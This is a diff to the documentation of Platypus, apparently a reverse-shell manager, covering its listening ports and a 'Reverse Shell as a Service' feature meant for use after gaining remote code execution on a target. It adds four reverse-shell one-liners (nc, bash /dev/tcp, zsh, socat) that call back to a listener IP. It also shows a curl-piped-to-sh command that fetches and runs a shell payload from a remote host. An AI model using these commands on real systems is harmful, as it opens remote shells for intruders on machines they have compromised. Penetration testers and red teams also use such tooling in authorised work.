@@ -2,11 +2,20 @@
 
 > NOTICE: ONLY WORKS on *NIX
 
-Platypus is able to multiplex the reverse shell listening port. Port 8080 can receive reverse shell client connection, also there is a Reverse Shell as a Service (RaaS) running on this port.
+Platypus is able to multiplex the reverse shell listening port. Port `1337 / 1338` can handle reverse shell client connections.  
+Also, There is another interesting feature that platypus provides, which is called `Reverse Shell as a Service (RaaS)`.
 
 Assume that you have got an arbitrary RCE on the target application, but the target application will strip the non-alphabet letter like `&`, `>`. then this feature will be useful.
+Like you have already used before, here are some **BAD** examples:
 
-To archive this, all you need is to construct a URL that indicates the target.
+```bash
+nc -e /bin/bash 192.168.174.132 8080
+bash -c 'bash -i >/dev/tcp/192.168.174.132/8080 0>&1'
+zsh -c 'zmodload zsh/net/tcp && ztcp 192.168.174.132 8080 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.174.132:8080
+```
+
+To archive your aim, all you need is to construct a URL that indicates the target.
 
 The command `bash -c "bash -i >/dev/tcp/5.6.7.8/1337 0>&1"` is the equivalent of `curl http://1.2.3.4:1337/5.6.7.8/1337 | sh`, this feature provides the capability to redirect a new reverse shell to another IP and port without remembering the boring reverse shell command.
 
